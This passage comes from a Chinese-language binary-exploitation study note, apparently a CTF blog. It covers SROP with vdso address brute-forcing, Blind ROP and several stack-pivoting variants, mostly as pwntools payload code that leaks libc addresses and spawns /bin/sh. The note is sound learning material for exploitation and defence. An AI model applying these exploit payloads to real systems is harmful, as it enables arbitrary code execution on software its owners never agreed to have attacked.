</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>padding</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=c1># fd</span>
</span></span><span class=line><span class=cl>                <span class=n>p32</span><span class=p>(</span><span class=n>vdso_addr</span><span class=p>)</span> <span class=o>+</span> <span class=c1># buf</span>
</span></span><span class=line><span class=cl>                <span class=n>p32</span><span class=p>(</span><span class=mh>0x2000</span><span class=p>)</span> <span class=c1># count</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;vdso.so&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;Success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>    python3 get_vdso.py
</span></span><span class=line><span class=cl>    <span class=nv>str</span><span class=o>=</span><span class=sb>`</span>file vdso.so<span class=sb>`</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[[</span> <span class=nv>$str</span> <span class=o>==</span> *stripped* <span class=o>]]</span>
</span></span><span class=line><span class=cl>    <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=nv>$str</span>
</span></span><span class=line><span class=cl>        <span class=nb>break</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=nv>$str</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span></span></span></code></pre></div></div><p><strong>利用</strong>：依靠 SROP，每次运行 vdso 地址随机化，爆破 vdso 地址再利用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 爆破代码</span>
</span></span><span class=line><span class=cl><span class=c1># vdso_range = range(0xf76d9000, 0xf77ce000, 0x1000) # 旧版内核</span>
</span></span><span class=line><span class=cl><span class=n>vdso_range</span> <span class=o>=</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0xf7ed0000</span><span class=p>,</span> <span class=mh>0xf7fd0000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>)</span> <span class=c1># 新版内核</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bruteforce</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>vdso_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>vdso_addr</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>vdso_range</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>(</span><span class=n>kernel</span><span class=o>=</span><span class=s2>&#34;i386&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>eax</span> <span class=o>=</span> <span class=n>constants</span><span class=o>.</span><span class=n>SYS_execve</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>ebx</span> <span class=o>=</span> <span class=n>bin_sh_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>eip</span> <span class=o>=</span> <span class=n>vdso_addr</span> <span class=o>+</span> <span class=mh>0x566</span> <span class=c1># address of int 0x80</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>esp</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=c1># 不可为空</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>ebp</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=c1># 不可为空</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 确保一下几个段寄存器值正确，Ring0返回Ring3时候会用到，gdb调试p $gs,cs,es,ds,ss等查看</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>gs</span> <span class=o>=</span> <span class=mi>99</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>cs</span> <span class=o>=</span> <span class=mi>35</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>es</span> <span class=o>=</span> <span class=mi>43</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>ds</span> <span class=o>=</span> <span class=mi>43</span>
</span></span><span class=line><span class=cl>    <span class=n>frame</span><span class=o>.</span><span class=n>ss</span> <span class=o>=</span> <span class=mi>43</span>
</span></span><span class=line><span class=cl>    <span class=n>ret_addr</span> <span class=o>=</span> <span class=n>vdso_addr</span> <span class=o>+</span> <span class=mh>0x561</span> <span class=c1># address of sigreturn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>cyclic</span><span class=p>(</span><span class=mh>0x10c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span> <span class=n>ret_addr</span><span class=p>,</span> <span class=n>frame</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 判断</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;echo pwned&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;pwned&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;pwned&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=p>(</span><span class=s1>&#39;Failed&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span></span></span></code></pre></div></div><p>main 函数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>p</span><span class=p>,</span> <span class=n>vdso_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Try </span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bruteforce</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=p>(</span><span class=s1>&#39;Wrong VDSO&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=p>(</span><span class=s1>&#39;vdso_addr = &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>vdso_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></div></div><h3 id=brop>BROP</h3><ul><li><p>Blind ROP，无法获得二进制文件通过 ROP 远程攻击，用于开启 ASLR、NX、Canary 的 64 位程序</p></li><li><p>条件：栈溢出漏洞，进程崩溃立即重启且进程加载地址重启后不变</p></li></ul><p>利用：</p><ol><li>判断栈溢出长度，【泄露 canary、rbp、返回地址】</li><li>寻找 stop_gadget（可以返回 main 函数的 gadget）</li><li>寻找 BROP gadgets（<code>__libc_csu_init</code>中的 gadgets），定位<code>pop rdi; ret</code>地址</li><li>寻找 puts 或 write 函数 plt，用于泄露其他地址值</li><li>dump plt 表来泄露所需函数 got 地址</li><li>泄露出 got 地址，libc 执行系统命令 getshell</li></ol><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 泄露栈溢出长度</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span></span></span></code></pre></div></div><h2 id=花式栈溢出>花式栈溢出</h2><p>① <strong>无 main 函数</strong></p><p>用 IDA 静态分析 main 的地址，在 gdb 中打该地址断点</p><h3 id=栈迁移>栈迁移</h3><p><strong>Stack Pivoting</strong></p><ul><li>溢出的距离短覆盖不到返回地址</li><li>距离短，覆盖了返回地址无法继续构造 ROP 链</li><li>需要二次 ROP</li></ul><p><strong>&ldquo;pop ebp ret&rdquo; + &ldquo;leave ret&rdquo;</strong></p><blockquote><ol><li>覆盖<strong>ebp</strong>为非法伪造的地址（堆或 bss 段），覆盖返回地址为<code>pop ebp; ret</code>或 <code>leave; ret</code> 的 gadget 地址</li><li>执行到<code>leave</code>，即 <code>mov esp, ebp; pop ebp</code> ，ebp 值给 esp，先<strong>esp</strong>和<strong>ebp</strong>同时指向覆盖后的 ebp 位置【vuln ebp】</li><li>接着【vuln ebp】地址<code>pop</code>给<strong>ebp</strong>，此时<strong>ebp</strong>指向恶意伪造地址且 esp+offset</li><li><code>esp＋offset</code>后指向返回地址-恶意代码地址，执行<code>ret</code>，恶意代码地址 pop 给 eip，此时执行 eip 处指令且栈已完成迁移</li><li>此时 eip 和 ebp 同时指向恶意代码地址，新栈中由 read 提前读入构建好 ROP 链，即可完成利用</li></ol></blockquote><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x40uLL</span><span class=p>);</span> <span class=c1>// buf [rbp-0x30]
</span></span></span><span class=line><span class=cl><span class=c1>// 实际read时是向rbp-0x30的位置写
</span></span></span></code></pre></div></div><p><strong>原理示意</strong></p><p>图中 ret 时 rsp 也应该移动</p><img src=/img/pwn_note.zh-cn.assets/172844664601118.png alt=图片无法加载><p><strong>纯栈上栈迁移</strong></p><p><strong>32 位</strong></p><p>buf 足够大</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>[</span><span class=n>利用链</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>buf_addr</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 利用链</span>
</span></span><span class=line><span class=cl><span class=n>lian</span> <span class=o>=</span> <span class=n>puts</span><span class=nd>@plt</span> <span class=o>+</span> <span class=n>main_addr</span> <span class=o>+</span> <span class=n>puts</span><span class=nd>@got</span> <span class=c1># 泄露libc</span>
</span></span><span class=line><span class=cl><span class=n>lian</span> <span class=o>=</span> <span class=n>system_addr</span> <span class=o>+</span> <span class=n>main_addr</span> <span class=o>+</span> <span class=n>fake_ebp</span><span class=o>+</span><span class=mi>12</span> <span class=o>+</span> <span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241107150243704.png alt=图片无法加载><p><strong>64 位</strong></p><ul><li>有<code>system</code>函数<code>plt</code>，有<code>rop</code>链，得到<code>ebp</code>栈地址，无<code>/bin/sh</code>字符串，需自行输入</li><li>将栈上 rbp 覆盖为 fake_rbp-0x8，因为 leave 中 mov rsp, rbp 后还有 pop rbp 使得 rsp 增加</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>ebp_addr</span> <span class=o>-</span> <span class=mh>0x8</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=mh>0x8</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span>           <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span>     <span class=o>+</span> \\ <span class=c1># ebp位置直接作为返回地址</span>
</span></span><span class=line><span class=cl>           <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_addr</span><span class=p>)</span>  <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>  <span class=o>+</span> \\
</span></span><span class=line><span class=cl>           <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>   <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>    <span class=o>+</span> \\
</span></span><span class=line><span class=cl>           <span class=n>p64</span><span class=p>(</span><span class=n>ebp_addr</span><span class=o>-</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span> \\</span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/172844664601119.png alt=图片无法加载><ul><li>buf 足够大（0x100），写入利用链</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>[</span><span class=n>利用链</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf_addr</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 跳转到fake_rbp即buf_addr位置</span></span></span></code></pre></div></div><p><strong>栈空闲地址迁移</strong></p><p><strong>32 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack</span> <span class=o>-</span> <span class=mh>0x500</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> \ <span class=c1># ebp</span>
</span></span><span class=line><span class=cl>            <span class=n>p32</span><span class=p>(</span><span class=n>read_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>leave_ret</span><span class=p>)</span> <span class=o>+</span> \ <span class=c1># 返回地址 + 预留返回地址</span>
</span></span><span class=line><span class=cl>            <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack</span> <span class=o>-</span> <span class=mh>0x500</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span> <span class=c1># arg1-3</span>
</span></span><span class=line><span class=cl><span class=c1># 再写入rop链</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><ul><li>调用 read 函数将 rop 写入空闲地址(stack-0x1000)处，执行 rop</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=o>-</span><span class=mh>0x1000</span><span class=o>-</span><span class=mh>0x8</span><span class=p>)</span> \\ <span class=c1># rbp -&gt; fake_rbp - 8</span>
</span></span><span class=line><span class=cl>		<span class=o>+</span> <span class=n>pop_rdi</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>	\\
</span></span><span class=line><span class=cl>    	<span class=o>+</span> <span class=n>pop_rsi</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>-</span> <span class=mh>0x1000</span><span class=p>)</span>	\\
</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>pop_rdx</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>	\\
</span></span><span class=line><span class=cl>		<span class=o>+</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>leave_ret_addr</span>
</span></span><span class=line><span class=cl><span class=c1># 再写入rop链</span></span></span></code></pre></div></div><p><strong>bss 段上栈迁移</strong></p><p><strong>64 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>x</span><span class=o>/</span><span class=mi>30</span><span class=n>ga</span> <span class=mh>0x404000</span> <span class=c1># bss段: 0x404000-0x405000</span>
</span></span><span class=line><span class=cl><span class=mh>0x404000</span><span class=p>:</span>	<span class=mh>0x0</span>	<span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mh>0x404010</span><span class=p>:</span>	<span class=mh>0x0</span>	<span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mh>0x404020</span> <span class=o>&lt;</span><span class=n>stdout</span><span class=nd>@GLIBC_2</span><span class=mf>.2.5</span><span class=o>&gt;</span><span class=p>:</span>	<span class=mh>0x7f74229e4760</span> <span class=o>&lt;</span><span class=n>_IO_2_1_stdout_</span><span class=o>&gt;</span>	<span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mh>0x404030</span> <span class=o>&lt;</span><span class=n>stdin</span><span class=nd>@GLIBC_2</span><span class=mf>.2.5</span><span class=o>&gt;</span><span class=p>:</span>	<span class=mh>0x7f74229e3a80</span> <span class=o>&lt;</span><span class=n>_IO_2_1_stdin_</span><span class=o>&gt;</span>	    <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mh>0x404040</span> <span class=o>&lt;</span><span class=n>stderr</span><span class=nd>@GLIBC_2</span><span class=mf>.2.5</span><span class=o>&gt;</span><span class=p>:</span>	<span class=mh>0x7f74229e4680</span> <span class=o>&lt;</span><span class=n>_IO_2_1_stderr_</span><span class=o>&gt;</span>	<span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mh>0x404050</span><span class=p>:</span>	<span class=mh>0x0</span>	<span class=mh>0x0</span></span></span></code></pre></div></div><ul><li><code>bss</code>段上使用偏移<code>0x200</code>后的地址作为伪造栈</li><li>read 函数后使得 rbp 进入<code>bss</code>段中，接着返回 read 函数前</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bss_addr</span> <span class=o>=</span> <span class=mh>0x404200</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#                         伪造rbp          return address</span></span></span></code></pre></div></div><ul><li>由于 buf 大小 0x80，通过 read 向<code>rbp-0x80=bss_addr-0x80</code>读入 payload2</li><li>read 返回后的指令为<code>leave;ret;</code>使得 rbp 变为<code>bss_addr-0x80</code>，rsp 将<code>leave_ret_addr</code>pop 给 rip【ret 指令】</li><li>接着执行返回地址<code>leave_ret_addr</code>中的<code>leave;ret;</code>指令，将 rbp 变为<code>bss_addr+0x600</code>后将顺序执行 flat 中指令</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>	<span class=n>bss_addr</span> <span class=o>+</span> <span class=mh>0x600</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rdi_ret_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>	<span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span>
